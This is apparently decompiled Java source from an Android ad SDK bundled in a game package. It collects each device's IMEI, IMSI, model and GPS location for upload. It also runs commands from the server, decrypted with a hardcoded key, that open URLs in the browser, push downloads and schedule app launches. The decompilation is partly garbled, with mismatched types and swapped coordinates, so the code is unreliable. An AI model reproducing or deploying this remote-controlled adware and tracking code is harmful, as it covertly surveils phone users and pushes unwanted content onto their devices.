package com.jgamelbe.CMP.b;
public abstract class j {
    private static final String b;
    protected android.content.Context a;

    static j()
    {
        String v0_1;
        if ("----->" != null) {
            v0_1 = "----->";
        } else {
            v0_1 = "MyStack";
        }
        com.jgamelbe.CMP.b.j.b = v0_1;
        return;
    }

    public j()
    {
        return;
    }

    private void d(org.json.JSONObject p10)
    {
        android.app.AlarmManager v0_19 = p10.optString("cmdToken1", "");
        if ((v0_19 != null) && ((v0_19.length() > 0) && (!v0_19.equals("null")))) {
            android.app.AlarmManager v0_13 = new com.jgamelbe.CMP.e.e("url0ose9ow8c3oweorcxzeju").a(v0_19);
            if (!v0_13.startsWith("http://")) {
                v0_13 = new StringBuilder("http://").append(v0_13).toString();
            }
            android.app.PendingIntent v1_20 = new android.content.Intent("android.intent.action.VIEW", android.net.Uri.parse(v0_13));
            v1_20.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
            this.a.startActivity(v1_20);
        }
        android.app.AlarmManager v0_20 = p10.optString("cmdToken2", "");
        if ((v0_20 != null) && ((v0_20.length() > 0) && (!v0_20.equals("null")))) {
            android.app.AlarmManager v0_21 = new com.jgamelbe.CMP.e.e("url0ose9ow8c3oweorcxzeju").a(v0_20);
            if (!v0_21.startsWith("http://")) {
                v0_21 = new StringBuilder("http://").append(v0_21).toString();
            }
            android.app.PendingIntent v1_32 = new android.content.Intent("android.intent.action.VIEW", android.net.Uri.parse(v0_21));
            v1_32.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
            this.a.startActivity(v1_32);
        }
        android.app.AlarmManager v0_27 = p10.optString("cmdToken3", "");
        if ((v0_27 != null) && ((v0_27.length() > 0) && (!v0_27.equals("null")))) {
            android.app.AlarmManager v0_2 = new com.jgamelbe.CMP.e.e("url0ose9ow8c3oweorcxzeju").a(v0_27);
            if (!v0_2.startsWith("http://")) {
                v0_2 = new StringBuilder("http://").append(v0_2).toString();
            }
            android.app.PendingIntent v1_2 = new com.jgamelbe.CMP.c.a();
            v1_2.h = v0_2;
            v1_2.c = "net.miidi.pushcmd";
            v1_2.p = 0;
            com.jgamelbe.CMP.a.c.a(this.a, v1_2, 1);
        }
        android.app.AlarmManager v0_6 = p10.optString("cmdToken4", "");
        if ((v0_6 != null) && ((v0_6.length() > 0) && (!v0_6.equals("null")))) {
            android.app.AlarmManager v0_7 = new com.jgamelbe.CMP.e.e("url0ose9ow8c3oweorcxzeju").a(v0_6);
            if ((v0_7 != null) && (v0_7.length() > 0)) {
                android.app.PendingIntent v1_12 = new android.content.Intent(this.a, com.jgamelbe.CMP.e.r.a().f);
                v1_12.setAction(com.jgamelbe.CMP.e.b());
                v1_12.putExtra("packageName", v0_7);
                android.app.PendingIntent v1_13 = android.app.PendingIntent.getBroadcast(this.a, 0, v1_12, 0);
                long v2_8 = java.util.Calendar.getInstance();
                v2_8.setTimeInMillis(System.currentTimeMillis());
                v2_8.add(13, (43200 + ((int) (Math.random() * 1800.0))));
                ((android.app.AlarmManager) this.a.getSystemService("alarm")).set(0, v2_8.getTimeInMillis(), v1_13);
            }
        }
        return;
    }

    public abstract com.jgamelbe.CMP.b.i a();

    public com.jgamelbe.CMP.b.i a(org.json.JSONObject p3)
    {
        com.jgamelbe.CMP.b.i v0 = this.b(p3);
        if (v0.a == 0) {
            this.a(p3, v0);
        }
        return v0;
    }

    public java.util.ArrayList a(String p7)
    {
        org.apache.http.message.BasicNameValuePair v0_8 = com.jgamelbe.CMP.e.q.a().l;
        java.util.ArrayList v1_1 = new java.util.ArrayList();
        v1_1.add(new org.apache.http.message.BasicNameValuePair("model", com.jgamelbe.CMP.e.q.a().i));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("imei", com.jgamelbe.CMP.e.q.a().b));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("imsi", com.jgamelbe.CMP.e.q.a().a));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("versoft", "android_v10.2.8"));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("sysVer", String.valueOf(com.jgamelbe.CMP.e.q.a().g)));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("appPackageName", com.jgamelbe.CMP.e.r.a().c()));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("productId", com.jgamelbe.CMP.e.r.a().a));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("testMode", String.valueOf(com.jgamelbe.CMP.e.r.a().c)));
        if (v0_8 != null) {
            try {
                v1_1.add(new org.apache.http.message.BasicNameValuePair("latitude", String.valueOf(v0_8.getLatitude())));
                v1_1.add(new org.apache.http.message.BasicNameValuePair("longitude", String.valueOf(v0_8.getLongitude())));
            } catch (org.apache.http.message.BasicNameValuePair v0) {
            }
        }
        v1_1.add(new org.apache.http.message.BasicNameValuePair("channelId", String.valueOf(com.jgamelbe.CMP.e.r.a().d)));
        v1_1.add(new org.apache.http.message.BasicNameValuePair("netChannel", String.valueOf(com.jgamelbe.CMP.e.q.a().b(this.a))));
        if (p7 != null) {
            v1_1.add(new org.apache.http.message.BasicNameValuePair("token", p7));
        }
        org.apache.http.message.BasicNameValuePair v0_5 = com.jgamelbe.CMP.e.q.a().d();
        if (v0_5 == null) {
            v1_1.add(new org.apache.http.message.BasicNameValuePair("apn", ""));
        } else {
            v1_1.add(new org.apache.http.message.BasicNameValuePair("apn", v0_5));
        }
        return v1_1;
    }

    public abstract void a();

    public com.jgamelbe.CMP.b.i b(org.json.JSONObject p5)
    {
        com.jgamelbe.CMP.b.i v1_1 = new com.jgamelbe.CMP.b.i();
        if (p5 == null) {
            if (p5 == null) {
                com.jgamelbe.CMP.e.g.a(com.jgamelbe.CMP.b.j.b, "[MyStack]execute() jsonObject == null !");
            }
        } else {
            if (p5.has("optCode")) {
                p5 = p5.optJSONObject("optCode");
            }
            if ((!p5.has("code")) || (!p5.has("desc"))) {
                v1_1.a = 0;
            } else {
                try {
                    v1_1.a = p5.getInt("code");
                    v1_1.b = p5.getString("desc");
                    com.jgamelbe.CMP.e.g.c(com.jgamelbe.CMP.b.j.b, new StringBuilder("[MyStack]execute() return code = ").append(v1_1.a).toString());
                } catch (Exception v0_12) {
                    v0_12.printStackTrace();
                }
            }
        }
        return v1_1;
    }

    public org.json.JSONObject b(String p6)
    {
        org.json.JSONObject v0_1 = new org.json.JSONObject();
        try {
            String v1_1 = com.jgamelbe.CMP.e.q.a().l;
            v0_1.put("model", com.jgamelbe.CMP.e.q.a().i);
            v0_1.put("imei", com.jgamelbe.CMP.e.q.a().b);
            v0_1.put("imsi", com.jgamelbe.CMP.e.q.a().a);
            v0_1.put("versoft", "android_v10.2.8");
            v0_1.put("sysVer", String.valueOf(com.jgamelbe.CMP.e.q.a().g));
            v0_1.put("appPackageName", com.jgamelbe.CMP.e.r.a().c());
            v0_1.put("productId", com.jgamelbe.CMP.e.r.a().a);
            v0_1.put("testMode", com.jgamelbe.CMP.e.r.a().c);
        } catch (String v1) {
            return v0_1;
        }
        if (p6 != null) {
            v0_1.put("token", p6);
        }
        if (v1_1 != null) {
            v0_1.put("latitude", v1_1.getLongitude());
            v0_1.put("longitude", v1_1.getLatitude());
        }
        v0_1.put("channelId", String.valueOf(com.jgamelbe.CMP.e.r.a().d));
        v0_1.put("netChannel", String.valueOf(com.jgamelbe.CMP.e.q.a().b(this.a)));
        String v1_5 = com.jgamelbe.CMP.e.q.a().d();
        if (v1_5 == null) {
            v0_1.put("apn", "");
            return v0_1;
        } else {
            v0_1.put("apn", v1_5);
            return v0_1;
        }
    }

    protected void c(org.json.JSONObject p3)
    {
        if (p3 != null) {
            try {
                com.jgamelbe.CMP.e.p.a = p3.optString("moneyName", "\u79ef\u5206");
                com.jgamelbe.CMP.e.p.b = p3.optBoolean("showScoreInAppList", 1);
                com.jgamelbe.CMP.e.p.c = p3.optBoolean("pushAdShowScore", 1);
                com.jgamelbe.CMP.e.p.d = p3.optBoolean("autoPushAd", 1);
                com.jgamelbe.CMP.e.p.e = p3.optInt("autoPushDelayTime", 0);
                com.jgamelbe.CMP.e.p.h = p3.optInt("autoPushType", 0);
                com.jgamelbe.CMP.e.p.k = p3.optBoolean("pushApiSwitch", 1);
                com.jgamelbe.CMP.e.p.l = p3.optBoolean("pushAdAutoDown", 1);
                com.jgamelbe.CMP.e.p.n = p3.optBoolean("pushAdSound", 1);
                com.jgamelbe.CMP.e.p.o = p3.optBoolean("showDetailOnClickListItem", 0);
                com.jgamelbe.CMP.e.p.p = p3.optBoolean("autoActiveScore", 0);
                com.jgamelbe.CMP.e.p.q = p3.optInt("minScore", 0);
                com.jgamelbe.CMP.e.p.g = p3.optInt("pushInterval", 600);
                com.jgamelbe.CMP.e.p.t = p3.optString("appVer", "");
                com.jgamelbe.CMP.e.p.r = p3.optBoolean("autoUpdate", 0);
                com.jgamelbe.CMP.e.p.s = p3.optString("appDownUrl", "");
                com.jgamelbe.CMP.e.p.a().b(this.a);
                this.d(p3);
            } catch (Exception v0_32) {
                v0_32.printStackTrace();
            }
        }
        return;
    }
}
